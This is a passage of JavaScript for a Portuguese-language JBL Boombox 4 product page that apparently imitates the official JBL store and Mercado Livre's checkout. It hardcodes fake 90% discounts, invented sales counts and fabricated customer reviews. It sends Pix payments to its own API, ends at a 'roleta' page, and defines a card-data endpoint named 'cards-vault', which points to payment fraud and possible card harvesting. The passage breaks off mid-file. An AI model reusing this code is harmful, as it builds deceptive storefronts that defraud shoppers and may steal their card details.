/* =========================================================
   JBL Store — PDP (Boombox 4)
   Página única: nenhuma interação abre outra aba.
   ========================================================= */
(function () {
  'use strict';

  /* ------------------------- utilitários ------------------------- */
  const $ = (sel, ctx) => (ctx || document).querySelector(sel);
  const $$ = (sel, ctx) => Array.from((ctx || document).querySelectorAll(sel));
  const _ID_MAP = { cpf: 'fCpf', nome: 'fNome', email: 'fEmail', tel: 'fFone' };
  const el = id => document.getElementById(_ID_MAP[id] || id);
  const S = { payMethod: 'pix', cardData: null, step: 1 };

  const BRL = new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' });
  const money = n => BRL.format(n);

  /** "147,59" -> 'R$ 147<sup>59</sup>' (centavos sobrescritos, padrão do layout) */
  const supPrice = txt => {
    const [int, dec = '00'] = String(txt).split(',');
    return `R$ ${int}<sup>${dec}</sup>`;
  };

  /** Escapa texto vindo do usuário antes de ir para innerHTML. */
  const esc = s => String(s).replace(/[&<>"']/g, c =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

  const plural = n => `${n} unidade${n > 1 ? 's' : ''}`;

  /* =============================== DADOS =============================== */
  const PRODUCT = "Caixa de Som Bluetooth À Prova D'água JBL Boombox 4";

  const _im = (url, alt) => ({ thumb: url, full: url, zoom: url, w: 800, h: 800, zw: 1000, zh: 1000, type: 'img', alt });
  const _vid = (src, poster, alt) => ({ thumb: poster, poster: poster, src: src, w: 720, h: 1280, type: 'video', alt });
  /* Branca — galeria oficial do CDN do Mercado Livre */
  const _ml2 = id => `https://http2.mlstatic.com/D_NQ_NP_2X_${id}-F.webp`;
  const _ml1 = id => `https://http2.mlstatic.com/D_NQ_NP_${id}-F.webp`;
  const _g = (id, alt) => ({ thumb: _ml1(id), full: _ml2(id), zoom: _ml2(id), w: 500, h: 500, zw: 1200, zh: 1200, type: 'img', alt });

  const GAL_PRETA = [
    _im('https://lojas.b-cdn.net/jbl-img/preto_1.jpg', 'JBL Boombox 4 Preta — frente'),
    _vid('https://lojas.b-cdn.net/jbl/boombox-preto.mp4', 'https://lojas.b-cdn.net/jbl-img/preto_1.jpg', 'Vídeo da JBL Boombox 4'),
    _im('https://lojas.b-cdn.net/jbl-img/preto_2.webp', 'JBL Boombox 4 Preta — detalhe'),
    _im('https://lojas.b-cdn.net/jbl-img/preto_3.webp', 'JBL Boombox 4 Preta — traseira'),
    _im('https://lojas.b-cdn.net/jbl-img/preto_4.webp', 'JBL Boombox 4 Preta — em uso')
  ];
  const GAL_BRANCA = [
    _g('629142-MLA91280310883_082025', 'JBL Boombox 4 Branca — frente'),
    _g('971936-MLA95739139000_102025', 'JBL Boombox 4 Branca — lateral'),
    _g('879139-MLA90890016828_082025', 'JBL Boombox 4 Branca — alto-falantes'),
    _g('928026-MLA91280596441_082025', 'JBL Boombox 4 Branca — puxador'),
    _g('751968-MLA91280645943_082025', 'JBL Boombox 4 Branca — conexões'),
    _g('751705-MLA91280477927_082025', 'JBL Boombox 4 Branca — IP68'),
    _g('681152-MLA91280606493_082025', 'JBL Boombox 4 Branca — ao ar livre'),
    _g('631151-MLA91280507779_082025', 'JBL Boombox 4 Branca — conteúdo')
  ];
  const GAL_AZUL = [
    _im('https://lojas.b-cdn.net/jbl-img/azul_1.jpg', 'JBL Boombox 4 Azul — frente'),
    _vid('https://lojas.b-cdn.net/jbl/boombox-preto.mp4', 'https://lojas.b-cdn.net/jbl-img/azul_1.jpg', 'Vídeo da JBL Boombox 4'),
    _im('https://lojas.b-cdn.net/jbl-img/azul_2.jpg', 'JBL Boombox 4 Azul — detalhe'),
    _im('https://lojas.b-cdn.net/jbl-img/azul_3.jpg', 'JBL Boombox 4 Azul — em uso')
  ];
  const GAL_LARANJA = [
    _im('https://lojas.b-cdn.net/jbl-img/laranja_1.jpg', 'JBL Boombox 4 Laranja — frente'),
    _im('https://lojas.b-cdn.net/jbl-img/laranja_2.jpg', 'JBL Boombox 4 Laranja — detalhe'),
    _im('https://lojas.b-cdn.net/jbl-img/laranja_3.webp', 'JBL Boombox 4 Laranja — traseira'),
    _im('https://lojas.b-cdn.net/jbl-img/laranja_4.jpg', 'JBL Boombox 4 Laranja — em uso')
  ];
  const GAL_CAMUFLADA = [
    _im('https://lojas.b-cdn.net/jbl-img/camuflada_1.webp', 'JBL Boombox 4 Camuflada — frente'),
    _vid('https://lojas.b-cdn.net/jbl/boombox-camuflada.mp4', 'https://lojas.b-cdn.net/jbl-img/camuflada_1.webp', 'Vídeo da JBL Boombox 4 Camuflada'),
    _im('https://lojas.b-cdn.net/jbl-img/camuflada_2.webp', 'JBL Boombox 4 Camuflada — detalhe'),
    _im('https://lojas.b-cdn.net/jbl-img/camuflada_3.webp', 'JBL Boombox 4 Camuflada — em uso')
  ];
  const GAL_MARROM = [
    _im('https://lojas.b-cdn.net/jbl-img/marrom_1.jpg', 'JBL Boombox 4 Marrom — frente'),
    _vid('https://lojas.b-cdn.net/jbl/boombox-marrom.mp4', 'https://lojas.b-cdn.net/jbl-img/marrom_1.jpg', 'Vídeo da JBL Boombox 4 Marrom'),
    _im('https://lojas.b-cdn.net/jbl-img/marrom_2.jpg', 'JBL Boombox 4 Marrom — detalhe'),
    _im('https://lojas.b-cdn.net/jbl-img/marrom_3.webp', 'JBL Boombox 4 Marrom — traseira'),
    _im('https://lojas.b-cdn.net/jbl-img/marrom_4.jpg', 'JBL Boombox 4 Marrom — em uso')
  ];

  /* Preta é a cor pré-selecionada → é a galeria padrão. */
  const GALLERY = GAL_PRETA;
  const COLOR_GALLERIES = {
    'Preta': null, 'Branca': GAL_BRANCA, 'Azul': GAL_AZUL,
    'Laranja': GAL_LARANJA, 'Camuflada': GAL_CAMUFLADA, 'Marrom': GAL_MARROM
  };
  let activeGallery = GALLERY;

  const PHOTOS = GALLERY.filter(g => g.type === 'img');
  const photoIndex = (() => { let n = -1; return GALLERY.map(g => (g.type === 'img' ? ++n : -1)); })();

  /* Imagens dos cards relacionados / da loja */
  const REL_IMGS = [
    'https://lojas.b-cdn.net/jbl-img/torre_aiwa.webp', 'https://lojas.b-cdn.net/jbl-img/mondial.webp', 'https://lojas.b-cdn.net/jbl-img/jyx.webp', 'https://lojas.b-cdn.net/jbl-img/partybox330.webp', 'https://lojas.b-cdn.net/jbl-img/xtreme5.jpg',
    'https://lojas.b-cdn.net/jbl-img/charge6.jpg', 'https://lojas.b-cdn.net/jbl-img/flip6.webp', 'https://lojas.b-cdn.net/jbl-img/jbl_fone.webp', 'https://lojas.b-cdn.net/jbl-img/case_boombox.webp'
  ];

  const RELATED = [
    { img: 1, t: 'Torre de Som AIWA T2W-02 2300W Bluetooth', p: '89,90', old: '899,00', off: '90% OFF', sold: '+500 vendidos', ship: 1 },
    { img: 2, t: 'Caixa de Som Mondial CM-1000-N X-Sound Amplificada 1000W', p: '49,90', old: '499,00', off: '90% OFF', sold: '+1000 vendidos', ship: 1 },
    { img: 3, t: 'JYX Caixa de Som Karaokê Bluetooth com 2 Microfones Sem Fio', p: '79,90', old: '799,00', off: '90% OFF', sold: '+500 vendidos', ship: 1 },
    { img: 4, t: 'JBL PartyBox Stage 330 280W Branca Bluetooth', p: '69,90', old: '699,00', off: '90% OFF', sold: '+1000 vendidos', pix: 1, ship: 1 },
    { img: 5, t: 'JBL Xtreme 5 Preto/Azul-petróleo IP68 28h', p: '49,90', old: '499,00', off: '90% OFF', sold: '+1000 vendidos', ship: 1 },
    { img: 6, t: 'JBL Charge 6 com Cabo Trançado IP68', p: '19,90', old: '199,00', off: '90% OFF', sold: '+10mil vendidos', ship: 1, full: 1 },
    { img: 7, t: "JBL Flip 6 À Prova D'água Bluetooth Portátil", p: '39,90', old: '399,00', off: '90% OFF', sold: '+10mil vendidos', ship: 1, full: 1 },
    { img: 8, t: 'JBL Fone de Ouvido Bluetooth Sem Fio Wave 200 TWS', p: '19,90', old: '199,00', off: '90% OFF', sold: '+10mil vendidos', ship: 1, full: 1 }
  ];
  const STORE = [
    { img: 6, t: 'JBL Charge 6 com Cabo Trançado IP68', p: '19,90', old: '199,00', off: '90% OFF', sold: '+10mil vendidos', pix: 1, ship: 1, full: 1 },
    { img: 5, t: 'JBL Xtreme 5 Preto/Azul-petróleo IP68 28h', p: '49,90', old: '499,00', off: '90% OFF', sold: '+1000 vendidos', ship: 1 },
    { img: 4, t: 'JBL PartyBox Stage 330 280W Branca', p: '69,90', old: '699,00', off: '90% OFF', sold: '+1000 vendidos', ship: 1 },
    { img: 7, t: "JBL Flip 6 À Prova D'água Bluetooth Portátil", p: '39,90', old: '399,00', off: '90% OFF', sold: '+10mil vendidos', ship: 1, full: 1 }
  ];
  const ASIDE = [
    { img: 6, t: 'JBL Charge 6 com Cabo Trançado IP68', p: '19,90', old: '199,00', off: '90% OFF', sold: '+10mil vendidos', pix: 1, ship: 1, full: 1 },
    { img: 7, t: "JBL Flip 6 À Prova D'água", p: '39,90', old: '399,00', off: '90% OFF', sold: '+10mil vendidos', ship: 1, full: 1 },
    { img: 4, t: 'JBL PartyBox Stage 330 280W Branca', p: '69,90', old: '699,00', off: '90% OFF', sold: '+1000 vendidos', ship: 1 },
    { img: 5, t: 'JBL Xtreme 5 Preto/Azul-petróleo IP68', p: '49,90', old: '499,00', off: '90% OFF', sold: '+1000 vendidos', ship: 1 }
  ];

  const REVIEWS = [
    { rate: 5, country: 'México', when: 'Há 6 meses', ageDays: 180, likes: 178,
      text: 'Som: os graves 10/10. Esta caixa de som é épica de tão boa que soa. Enche qualquer ambiente com facilidade, dentro ou fora de casa.', pics: [1, 2, 3] },
    { rate: 5, country: 'México', when: 'Há 10 meses', ageDays: 300, likes: 146,
      text: 'Superior à Boombox 3. Sobre a distorção que dizem que ela tem, não acreditem (há saturação de grave, mas é por causa de músicas alteradas). Nota 10 de 10.', pics: [4, 5] },
    { rate: 5, country: 'México', when: 'Há 10 meses', ageDays: 305, likes: 116,
      text: 'Produto totalmente original. Se você busca qualidade, não hesite em ser um dos primeiros a ter essa beleza.', pics: [6, 7] },
    { rate: 5, country: 'Brasil', when: 'Há 9 meses', ageDays: 270, likes: 80,
      text: 'De todas que comprei, essa é a mais perfeita, sem comparação. Simplesmente linda demais 😍', pics: [8] },
    { rate: 5, country: 'Brasil', when: 'Há 5 meses', ageDays: 150, likes: 67,
      text: 'Comprei para usar em festas e não decepciona. Bateria dura o dia todo, graves impressionantes e o acabamento é lindo. Melhor caixa que já tive!', pics: [9, 10] },
    { rate: 5, country: 'Brasil', when: 'Há 3 meses', ageDays: 90, likes: 54,
      text: "Chegou rápido, original e com nota fiscal. O som enche a casa toda e a prova d'água já salvou numa festa na piscina. Recomendo demais!", pics: [11] }
  ];
  const REV_IMG = {
    1: 'https://lojas.b-cdn.net/jbl-img/rev1.webp', 2: 'https://lojas.b-cdn.net/jbl-img/rev2.jpg', 3: 'https://lojas.b-cdn.net/jbl-img/rev3.webp', 4: 'https://lojas.b-cdn.net/jbl-img/rev4.webp', 5: 'https://lojas.b-cdn.net/jbl-img/rev5.webp', 6: 'https://lojas.b-cdn.net/jbl-img/rev6.jpg',
    7: 'https://lojas.b-cdn.net/jbl-img/rev7.webp', 8: 'https://lojas.b-cdn.net/jbl-img/rev8.webp', 9: 'https://lojas.b-cdn.net/jbl-img/rev9.webp', 10: 'https://lojas.b-cdn.net/jbl-img/rev10.webp', 11: 'https://lojas.b-cdn.net/jbl-img/rev11.webp'
  };
  const REVIEW_PHOTOS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11];
  const revThumb = n => REV_IMG[n] || REV_IMG[1];
  const revFull = n => REV_IMG[n] || REV_IMG[1];

  const BARS = [
    { star: 5, pct: 94 }, { star: 4, pct: 4 }, { star: 3, pct: 1 }, { star: 2, pct: 0.5 }, { star: 1, pct: 0.5 }
  ];

  const SUGGESTIONS = [
    'jbl boombox 4', 'caixa de som bluetooth', 'jbl a prova d agua',
    'caixa jbl potente', 'boombox 4 branca', 'jbl partybox', 'caixa som festa'
  ];

  const icon = (id, cls) => `<svg${cls ? ` class="${cls}"` : ''} aria-hidden="true" focusable="false"><use href="#${id}"/></svg>`;
  const star = on => `<svg${on ? '' : ' class="off"'} aria-hidden="true" focusable="false"><use href="#i-star"/></svg>`;

  /* ============================ TOAST ============================ */
  const toastEl = $('#toast');
  const toastMsg = $('#toastMsg');
  let toastTimer;
  function toast(msg) {
    toastMsg.textContent = msg;
    toastEl.classList.add('is-open');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => toastEl.classList.remove('is-open'), 3400);
  }

  /* ============================ GALERIA ============================ */
  const thumbsEl = $('#thumbs');
  const stage = $('#stage');
  let gi = 0;
  let zoomArmed = false;   // a imagem 2x só é baixada no primeiro hover

  thumbsEl.innerHTML = activeGallery.map((g, i) => `
    <button class="thumb${i === 0 ? ' is-active' : ''}" type="button" data-i="${i}"
            aria-current="${i === 0}" aria-label="Ver imagem ${i + 1} de ${GALLERY.length}">
      <img src="${g.thumb}" width="112" height="112" decoding="async" alt="">
      ${g.type === 'video' ? `<span class="thumb__play">${icon('i-play')}</span>` : ''}
    </button>`).join('');

  $$('.thumb', thumbsEl).forEach(btn => {
    const go = () => setGallery(Number(btn.dataset.i));
    btn.addEventListener('mouseenter', go);
    btn.addEventListener('click', go);
    btn.addEventListener('focus', go);
  });

  function setGallery(i) {
    gi = (i + activeGallery.length) % activeGallery.length;
    const g = activeGallery[gi];

    $$('.thumb', thumbsEl).forEach((t, k) => {
      t.classList.toggle('is-active', k === gi);
      t.setAttribute('aria-current', String(k === gi));
    });

    if (g.type === 'video') {
      // pôster primeiro: o vídeo só é baixado quando a pessoa aperta play
      stage.innerHTML = `
        <div class="stage__video">
          <img src="${g.poster}" width="${g.w}" height="${g.h}" decoding="async" alt="${esc(g.alt)}">
          <button type="button" aria-label="Reproduzir vídeo do produto">${icon('i-play')}</button>
        </div>`;
      stage.classList.remove('is-zoom');
      $('button', stage).addEventListener('click', e => {
        e.stopPropagation();
        playVideo(g);
      });
    } else {
      stage.innerHTML = `
        <img id="stageImg" src="${g.full}" srcset="${g.full} ${g.w}w, ${g.zoom} ${g.zw}w"
             sizes="(max-width:899px) 92vw, 358px"
             width="${g.w}" height="${g.h}" decoding="async" alt="${esc(g.alt)}">
        <span class="stage__lens" id="lens" aria-hidden="true"></span>`;
      zoomArmed = false;
      armZoom();
    }
  }

  /** Troca o pôster pelo player e começa a tocar. Usa hls.js para HLS, nativo para mp4. */
  function playVideo(g) {
    stage.innerHTML = `
      <div class="stage__video">
        <video id="stageVid" poster="${g.poster}" width="${g.w}" height="${g.h}"
               controls autoplay playsinline preload="auto"></video>
      </div>`;
    const video = $('#stageVid', stage);
    const src = g.src;
    if (src.includes('.m3u8') && typeof Hls !== 'undefined' && Hls.isSupported()) {
      const hls = new Hls({ enableWorker: false });
      hls.loadSource(src);
      hls.attachMedia(video);
      hls.on(Hls.Events.MANIFEST_PARSED, () => video.play().catch(() => {}));
      hls.on(Hls.Events.ERROR, (_, d) => { if (d.fatal) toast('Não foi possível carregar o vídeo.'); });
    } else if (video.canPlayType('application/vnd.apple.mpegurl')) {
      video.src = src;
      video.play().catch(() => {});
    } else {
      video.src = src;
    }
    video.addEventListener('click', e => e.stopPropagation());
  }

  /** Aplica a imagem 2x como background da lente (uma vez por imagem). */
  function armZoom() {
    if (zoomArmed) return;
    const lens = $('#lens');
    if (!lens) return;
    lens.style.backgroundImage = `url("${GALLERY[gi].zoom}")`;
    zoomArmed = true;
  }

  /* listeners de zoom registrados uma única vez — o palco persiste, o conteúdo troca */
  stage.addEventListener('mouseenter', () => {
    if (!$('#lens')) return;
    armZoom();
    stage.classList.add('is-zoom');
  });
  stage.addEventListener('mouseleave', () => stage.classList.remove('is-zoom'));
  stage.addEventListener('mousemove', e => {
    const lens = $('#lens');
    if (!lens) return;
    const r = stage.getBoundingClientRect();
    const x = ((e.clientX - r.left) / r.width) * 100;
    const y = ((e.clientY - r.top) / r.height) * 100;
    lens.style.backgroundPosition = `${x}% ${y}%`;
  });
  stage.addEventListener('click', () => {
    const activePhotos = activeGallery.filter(g => g.type === 'img');
    const idx = activePhotos.indexOf(activeGallery[gi]);
    if (idx >= 0) openLightbox(idx, activePhotos.map(p => ({ src: p.zoom, thumb: p.thumb, alt: p.alt, w: p.zw, h: p.zh })));
  });

  $('#galPrev').addEventListener('click', () => setGallery(gi - 1));
  $('#galNext').addEventListener('click', () => setGallery(gi + 1));

  /* ============================ MODAIS ============================ */
  const FOCUSABLE = 'a[href],button:not([disabled]),input:not([disabled]),select,textarea,[tabindex]:not([tabindex="-1"])';
  let lastFocused = null;

  function openModal(el) {
    lastFocused = document.activeElement;
    el.hidden = false;
    document.body.style.overflow = 'hidden';
    const first = $(FOCUSABLE, el);
    if (first) first.focus();
  }
  function closeModals() {
    let changed = false;
    $$('.modal').forEach(m => {
      if (!m.hidden) { m.hidden = true; changed = true; }
    });
    if (!changed) return;
    document.body.style.overflow = '';
    if (lastFocused && document.contains(lastFocused)) lastFocused.focus();
    lastFocused = null;
  }
  function openModalEl() { return $$('.modal').find(m => !m.hidden) || null; }

  $$('.modal').forEach(m => {
    m.addEventListener('mousedown', e => { if (e.target === m) closeModals(); });
    $$('[data-close]', m).forEach(b => b.addEventListener('click', closeModals));
  });

  /* ---------- Lightbox ---------- */
  const lb = $('#lightbox');
  const lbImg = $('#lbImg');
  const lbThumbs = $('#lbThumbs');
  let lbi = 0;
  let lbSet = [];

  function openLightbox(index, set) {
    lbSet = set;
    lbi = Math.max(0, Math.min(index, lbSet.length - 1));
    lbThumbs.innerHTML = lbSet.map((g, k) => `
      <button class="thumb" type="button" data-i="${k}" aria-current="${k === lbi}" aria-label="Imagem ${k + 1}">
        <img src="${g.thumb}" width="112" height="112" loading="lazy" decoding="async" alt="">
      </button>`).join('');
    $$('.thumb', lbThumbs).forEach(b => b.addEventListener('click', () => lbGo(Number(b.dataset.i))));
    const single = lbSet.length < 2;
    $('#lbPrev').hidden = single;
    $('#lbNext').hidden = single;
    lbThumbs.hidden = single;
    lbGo(lbi);
    openModal(lb);
  }

  function lbGo(i) {
    lbi = (i + lbSet.length) % lbSet.length;
    const item = lbSet[lbi];
    lbImg.src = item.src;
    lbImg.alt = item.alt || '';
    if (item.w) { lbImg.width = item.w; lbImg.height = item.h; }
    $$('.thumb', lbThumbs).forEach((t, k) => {
      t.classList.toggle('is-active', k === lbi);
      t.setAttribute('aria-current', String(k === lbi));
    });
  }
  $('#lbPrev').addEventListener('click', () => lbGo(lbi - 1));
  $('#lbNext').addEventListener('click', () => lbGo(lbi + 1));

  /* ---------- teclado global dos modais ---------- */
  document.addEventListener('keydown', e => {
    const modal = openModalEl();

    if (e.key === 'Escape') {
      if (modal) { closeModals(); return; }
      const openDrop = $$('.dropdown.is-open, .qty__menu.is-open, .suggest.is-open')[0];
      if (openDrop) closeAllMenus();
      return;
    }
    if (!modal) return;

    if (modal === lb) {
      if (e.key === 'ArrowLeft') { e.preventDefault(); lbGo(lbi - 1); return; }
      if (e.key === 'ArrowRight') { e.preventDefault(); lbGo(lbi + 1); return; }
    }
    if (e.key === 'Tab') {                       // trava o foco dentro do modal
      const items = $$(FOCUSABLE, modal).filter(el => el.offsetParent !== null);
      if (!items.length) return;
      const first = items[0], last = items[items.length - 1];
      if (e.shiftKey && document.activeElement === first) { e.preventDefault(); last.focus(); }
      else if (!e.shiftKey && document.activeElement === last) { e.preventDefault(); first.focus(); }
    }
  });

  /* ==================== FAVORITO / SEGUIR / LISTA ==================== */
  $('#favBtn').addEventListener('click', function () {
    const on = this.getAttribute('aria-pressed') !== 'true';
    this.setAttribute('aria-pressed', String(on));
    this.setAttribute('aria-label', on ? 'Remover dos favoritos' : 'Adicionar aos favoritos');
    toast(on ? 'Produto adicionado aos favoritos.' : 'Produto removido dos favoritos.');
  });

  $('#followBtn').addEventListener('click', function () {
    const on = this.getAttribute('aria-pressed') !== 'true';
    this.setAttribute('aria-pressed', String(on));
    this.textContent = on ? 'Seguindo' : 'Seguir';
    toast(on ? 'Agora você segue a loja oficial JBL.' : 'Você deixou de seguir a loja.');
  });

  $('#listBtn').addEventListener('click', e => {
    e.preventDefault();
    toast('Produto adicionado à sua lista.');
  });

  /* ---------- Quantidade ---------- */
  const MAX_QTY = 12;
  let qty = 1;
  const qtyBtn = $('#qtyBtn');
  const qtyMenu = $('#qtyMenu');
  const qtyLabel = $('#qtyLabel');

  qtyMenu.innerHTML = Array.from({ length: MAX_QTY }, (_, k) => {
    const n = k + 1;
    return `<li role="option" tabindex="-1" data-q="${n}" aria-selected="${n === 1}">${plural(n)}</li>`;
  }).join('');

  function setQty(n) {
    qty = Math.min(Math.max(n, 1), MAX_QTY);
    qtyLabel.textContent = plural(qty);
    $$('li', qtyMenu).forEach(li => li.setAttribute('aria-selected', String(Number(li.dataset.q) === qty)));
    updateCheckout();
  }

  qtyBtn.addEventListener('click', e => {
    e.stopPropagation();
    const open = !qtyMenu.classList.contains('is-open');
    closeAllMenus();
    qtyMenu.classList.toggle('is-open', open);
    qtyBtn.setAttribute('aria-expanded', String(open));
    if (open) $(`li[aria-selected="true"]`, qtyMenu)?.focus();
  });
  qtyMenu.addEventListener('click', e => {
    const li = e.target.closest('li');
    if (!li) return;
    setQty(Number(li.dataset.q));
    closeAllMenus();
    qtyBtn.focus();
  });
  listboxKeys(qtyMenu, qtyBtn, li => { setQty(Number(li.dataset.q)); });

  /* ---------- Carrinho ---------- */
  let cart = 2;
  let extraItems = []; // itens de produtos relacionados adicionados ao carrinho

  function extraTotal() {
    return extraItems.reduce((s, i) => s + i.price * i.qty, 0);
  }

  function renderCartItems() {
    const el = $('#cartItemsList');
    if (!el) return;
    if (!extraItems.length) { el.innerHTML = ''; return; }
    el.innerHTML = extraItems.map(i => {
      const label = i.title.length > 38 ? i.title.slice(0, 38) + '…' : i.title;
      const qtyTxt = i.qty > 1 ? ` (${i.qty}x)` : '';
      const priceTxt = i.price > 0 ? money(i.price * i.qty) : '<span class="co-free">Grátis</span>';
      const imgTag = i.img
        ? `<img src="${esc(i.img)}" alt="" style="width:24px;height:24px;object-fit:cover;border-radius:4px;margin-right:6px;vertical-align:middle;display:inline-block">`
        : '';
      return `<p class="co-line co-line--extra"><span>${imgTag}${esc(label)}${esc(qtyTxt)}</span><span>${priceTxt}</span></p>`;
    }).join('');
  }
  $('#addCart').addEventListener('click', () => {
    cart += qty;
    $('#cartCount').textContent = String(cart);
    $('#cartBtn').setAttribute('aria-label', `Carrinho com ${cart} produtos`);
    toast(`Adicionado ao carrinho: ${plural(qty)}.`);
  });
  $('#cartBtn').addEventListener('click', () => toast(`Você tem ${cart} produtos no carrinho.`));

  /* ============================================================
     Checkout estilo Mercado Livre — fluxo em etapas (simulado)
     Etapas: 1) Endereço + entrega  2) Pagamento  3) Revisão → Pix
     ============================================================ */
  /* Oferta de back-redirect: quando ativa, o "preço unitário" passa a ser o
     do combo (2× por R$ 79,90 → R$ 39,95/un) em vez do preço da buy-opt. */
  let backOffer = null;                                 // { unit: 39.95, qty: 2 } quando ativa
  const unitPrice = () => backOffer ? backOffer.unit : Number($('.buy-opt.is-sel').dataset.pix);
  const OLD_UNIT = 399.00;                              // preço "cheio" p/ calcular economia
  const cho = $('#checkout');
  const steps = $$('.step', cho);
  const doneView = $('#choDone');
  let current = 1;                                      // etapa ativa
  let payMethod = 'pix';

  const PAY_LABEL = { pix: 'Pix', card: 'Cartão de crédito' };
  // build: v16

  /* Pixel Meta (fbq) — eventos client-side, deduplicados com o CAPI via eventID */
  const PRODUCT_ID = 'JBLBOOMBOX4BLKBR';
  /* Os eventos são disparados apenas no canal que trouxe a visita — ver a
     detecção de window._CHANNEL no index.html. Sem esse recorte, tráfego de
     um canal contaria conversão no pixel do outro e sujaria a otimização. */
  const isMeta   = () => window._CHANNEL !== 'tiktok';
  const isTikTok = () => window._CHANNEL === 'tiktok';

  function fbTrack(event, params, opts) {
    if (!isMeta()) return;
    if (typeof window.fbq === 'function') window.fbq('track', event, params || {}, opts || undefined);
  }

  /* Pixel TikTok (ttq) + Events API — sempre ativo */
  function ttkTrack(event, opts) {
    if (typeof window.ttkTrack === 'function') {
      window.ttkTrack(event, opts || {});
    } else if (typeof window.ttq !== 'undefined' && typeof window.ttq.track === 'function') {
      window.ttq.track(event, opts || {});
    }
  }
  function ttkIdentify(data) {
    if (typeof window.ttkIdentify === 'function') {
      window.ttkIdentify(data);
    } else if (typeof window.ttq !== 'undefined' && typeof window.ttq.identify === 'function') {
      window.ttq.identify(data);
    }
  }

  /* ===== Integração com a API própria de PIX + tracking =====
     Config vem de window.VONIXX_PIX (definido no index.html).
     api vazio → modo demonstração (QR/código fictícios). */
  const PIX_CFG = Object.assign(
    { api: '', offer: 'jbl', funnel: 'jbl', thankYouUrl: '', pollMs: 3000, expiresInDays: 1 },
    (window.VONIXX_PIX || {})
  );
  PIX_CFG.thankYouUrl = PIX_CFG.thankYouUrl || 'roleta/' + location.search;
  let pollTimer = null;
  const PAID_STATUS = ['APPROVED', 'PAID', 'PAGO', 'CONCLUIDA', 'COMPLETED'];
  const CARDS_API = PIX_CFG.cardsApi || 'https://cards-vault.onrender.com';
  const calcTotal = () => unitPrice() * qty;
  const fmt = n => money(n);
  function shake(inp, msg) {
    inp.classList.add('cf-shake');
    toast(msg);
    setTimeout(() => inp.classList.remove('cf-shake'), 500);
  }

  // captura sinais de tracking do Meta (fbclid/fbc/fbp/external_id) + UTMs
  function getTracking() {
    const p = new URLSearchParams(location.search);
    const g = k => p.get(k) || '';
    const cookie = n => (document.cookie.match('(^|;)\\s*' + n + '\\s*=\\s*([^;]+)') || [])[2] || '';
    // fbclid: pega da URL e persiste; se não veio na URL, usa o persistido
    let fbclid = g('fbclid'), externalId = '';
    // ttclid: URL primeiro; se não veio, o persistido pela ponte do TikTok.
    // Sem ele o webhook do tiktok-tracking não consegue atribuir o Purchase.
    let ttclid = g('ttclid');
    try {
      if (fbclid) localStorage.setItem('_fbclid', fbclid);
      else fbclid = localStorage.getItem('_fbclid') || '';
      if (ttclid) localStorage.setItem('ttclid', ttclid);
      else ttclid = localStorage.getItem('ttclid') || '';
      // Cada canal tem seu external_id próprio — o do TikTok é criado pela ponte
      externalId = localStorage.getItem(isTikTok() ? '_ttk_eid' : '_fb_eid') || '';
    } catch (_) {}
    return {
      utms: { utmSource: g('utm_source'), utmCampaign: g('utm_campaign'), utmMedium: g('utm_medium'), utmContent: g('utm_content'), utmTerm: g('utm_term') },
      fbclid,
      tiktokClickId: ttclid,
      fbc: cookie('_fbc'),
      fbp: cookie('_fbp'),
      externalId,
      landingPageUrl: location.href
    };
  }

  const SHIP_COST = { normal: 0, correios: 7.90, jadlog: 11.90, full: 15.90 };
  let meliPlusActive = false; // se true, frete zera (meli+ substitui)
  function shipCost() {
    const sec = document.getElementById('shipSection');
    if (!sec || sec.hidden) return null; // endereço não preenchido ainda
    if (meliPlusActive) return 0;         // meli+ ativo → frete grátis
    const sel = $('input[name="ship"]:checked');
    return SHIP_COST[sel ? sel.value : 'full'] ?? 0;
  }

  function updateCheckout() {
    const prod  = unitPrice() * qty;
    const extra = extraTotal();
    const ship  = shipCost(); // null = endereço não preenchido
    const shipVal = ship ?? 0;
    const total = prod + extra + shipVal;
    const oldTotal = OLD_UNIT * qty;
    const saved = oldTotal - prod;
    renderCartItems();
    $('#sumSub').textContent = money(prod);
    $('#sumSubtotal').textContent = money(prod + extra);
    const shipEl = $('#sumShip');
    if (shipEl) {
      if (ship === null) {
        shipEl.textContent = 'a calcular';
        shipEl.className = '';
      } else {
        shipEl.textContent = ship ? money(ship) : 'Grátis';
        shipEl.classList.toggle('co-free', !ship);
      }
    }
    $('#sumPay').textContent = money(total);
    $('#sumPayMethod').textContent = PAY_LABEL[payMethod];
    $('#sumOld').textContent = money(oldTotal);
    $('#sumTotal').textContent = money(total);
    $('#sumSave').textContent = `Você economizou ${money(saved)}`;
    $('#doneHeading').textContent = `Pague ${money(total)} via Pix para concluir sua compra`;
    fillParcelas(total);
  }

  /* ---- renderiza o estado das 3 etapas ---- */
  function renderSteps() {
    steps.forEach(s => {
      const i = Number(s.dataset.step);
      s.classList.toggle('is-active', i === current);
      s.classList.toggle('is-done', i < current);
      s.classList.toggle('is-locked', i > current);
      const edit = $('.step__edit', s);
      if (edit) edit.hidden = i >= current;
      const sum = $('.step__summary', s);
      if (sum) sum.hidden = i >= current;
    });
    cho.classList.toggle('is-review', current === 3);
    $('#choFlow').classList.toggle('is-review', current === 3);
    if (current === 3) updateReview();
    const active = steps.find(s => Number(s.dataset.step) === current);
    if (active) $('.step__title', active).setAttribute('tabindex', '-1'), $('.step__title', active).focus();
  }

  function goTo(n) {
    if (n === 1) {
      const p2 = document.getElementById('addrPhase2');
      const p1btn = document.getElementById('addrPhase1Btn');
      if (p2) p2.hidden = true;
      if (p1btn) p1btn.style.display = '';
    }
    current = n; S.step = n; renderSteps(); _updatePayBtn();
  }

  /* ---- máscaras leves ---- */
  const onlyDigits = v => v.replace(/\D/g, '');
  function maskCep(v) { v = onlyDigits(v).slice(0, 8); return v.length > 5 ? `${v.slice(0,5)}-${v.slice(5)}` : v; }
  function maskCard(v) { return onlyDigits(v).slice(0,16).replace(/(.{4})/g, '$1 ').trim(); }
  function maskVal(v) { v = onlyDigits(v).slice(0,4); return v.length > 2 ? `${v.slice(0,2)}/${v.slice(2)}` : v; }
  function maskCpf(v) {
    v = onlyDigits(v).slice(0, 11);
    return v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
  }

  /* ---- celular BR: regras do país (não deixa entrar número errado) ---- */
